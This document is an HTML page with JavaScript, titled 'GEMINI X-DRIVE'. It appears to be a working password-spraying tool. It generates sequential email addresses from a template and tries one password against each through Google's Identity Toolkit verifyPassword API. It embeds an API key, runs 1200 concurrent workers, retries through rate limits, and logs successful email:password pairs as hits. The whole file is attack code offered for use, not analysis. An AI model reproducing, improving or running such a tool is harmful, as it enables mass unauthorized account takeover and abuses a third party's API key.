<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GEMINI X-DRIVE V16</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 10px; }
        .main-frame { max-width: 600px; margin: auto; border: 2px solid #00ffcc; background: #080808; padding: 25px; box-shadow: 0 0 50px rgba(0, 255, 204, 0.4); border-radius: 15px; }
        h1 { font-size: 26px; color: #fff; text-shadow: 0 0 15px #00ffcc; margin: 0; }
        .sub-text { font-size: 10px; color: #aaa; margin-bottom: 20px; letter-spacing: 2px; }
        
        .input-group { display: flex; gap: 10px; margin-bottom: 10px; }
        input { flex: 1; padding: 15px; background: #111; border: 1px solid #00ffcc; color: #fff; text-align: center; border-radius: 8px; outline: none; font-size: 15px; }
        .full-input { width: 100%; margin-bottom: 10px; box-sizing: border-box; }
        
        .btn-ignite { width: 100%; padding: 22px; background: linear-gradient(45deg, #00ffcc, #0077ff); color: #000; border: none; font-weight: bold; font-size: 22px; cursor: pointer; border-radius: 10px; box-shadow: 0 0 20px rgba(0, 255, 204, 0.5); text-transform: uppercase; }
        .btn-ignite:active { transform: scale(0.96); }

        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
        .stat-card { background: #001a1a; padding: 15px; border: 1px solid #004444; border-radius: 10px; }
        .stat-card b { font-size: 35px; color: #fff; display: block; }
        
        #speed-tag { font-size: 16px; color: #ffeb3b; font-weight: bold; margin-bottom: 10px; background: #222; padding: 8px; border-radius: 5px; border: 1px dashed #ffeb3b; }
        #output-box { width: 100%; height: 350px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 12px; font-size: 14px; margin-top: 10px; border-radius: 8px; box-sizing: border-box; resize: none; }
    </style>
</head>
<body>

<div class="main-frame">
    <h1>GEMINI X-DRIVE</h1>
    <span class="sub-text">ZERO-MISS | CUSTOM START ENGINE</span>
    
    <div id="speed-tag">SYSTEM IDLE</div>

    <div class="input-group">
        <input type="number" id="startNum" placeholder="START (eg: 100000)">
        <input type="number" id="endNum" placeholder="END (eg: 999999)">
    </div>
    
    <input type="text" id="fmt" class="full-input" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" class="full-input" placeholder="PASSWORD">
    
    <button class="btn-ignite" id="btn" onclick="ignite()">⚡ START SEQUENTIAL SCAN</button>

    <div class="dashboard">
        <div class="stat-card"><span>VERIFIED</span><b id="c">0</b></div>
        <div class="stat-card"><span>HITS</span><b id="f">0</b></div>
    </div>

    <textarea id="output-box" readonly placeholder="Ordered results will stream here..."></textarea>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let index, head, limit;
    let storage = new Map();
    let uiBatch = "";
    let startTime;
    const key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
    const alertBell = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');

    async function ignite() {
        if (active) { location.reload(); return; }

        let start = parseInt(document.getElementById('startNum').value);
        let end = parseInt(document.getElementById('endNum').value);
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();

        if (isNaN(start) || isNaN(end) || !fmt.includes('{')) return alert("Enter valid start/end/format!");

        active = true;
        index = start;
        head = start;
        limit = end;
        startTime = Date.now();

        document.getElementById('btn').innerText = "🛑 STOP ENGINE";
        document.getElementById('btn').style.background = "#ff0055";

        // --- TURBO THREADS: 1200 PARALLEL WORKERS ---
        for (let i = 0; i < 1200; i++) {
            (async function stream() {
                while (active && index <= limit) {
                    let currentIdx = index++;
                    await checkAccount(fmt, pwd, currentIdx);
                }
            })();
        }

        // --- UI REFRESH SYNC (400ms) ---
        setInterval(() => {
            if (!active) return;
            document.getElementById('c').innerText = checked;
            document.getElementById('f').innerText = found;
            
            let elapsed = (Date.now() - startTime) / 1000;
            let spd = Math.round(checked / elapsed);
            document.getElementById('speed-tag').innerText = `🚀 SPEED: ${spd} REQ/SEC | SYNC AT: ${head}`;

            if (uiBatch !== "") {
                let box = document.getElementById('output-box');
                box.value += uiBatch;
                box.scrollTop = box.scrollHeight;
                uiBatch = "";
            }
        }, 400);
    }

    async function checkAccount(fmt, pwd, idx) {
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
        
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });

            if (res.status === 429) {
                await new Promise(r => setTimeout(r, 1500));
                return checkAccount(fmt, pwd, idx);
            }

            let data = await res.json();
            storage.set(idx, { ok: (data && data.idToken), mail: email });

            // --- THE SEQUENTIAL LOCK (Zero-Miss Logic) ---
            while (storage.has(head)) {
                let resData = storage.get(head);
                if (resData.ok) {
                    found++;
                    uiBatch += resData.mail + ":" + pwd + "\n";
                    alertBell.play().catch(()=>{});
                }
                checked++;
                storage.delete(head);
                head++;
            }

        } catch (e) {
            return checkAccount(fmt, pwd, idx);
        }
    }
</script>
</body>
</html>
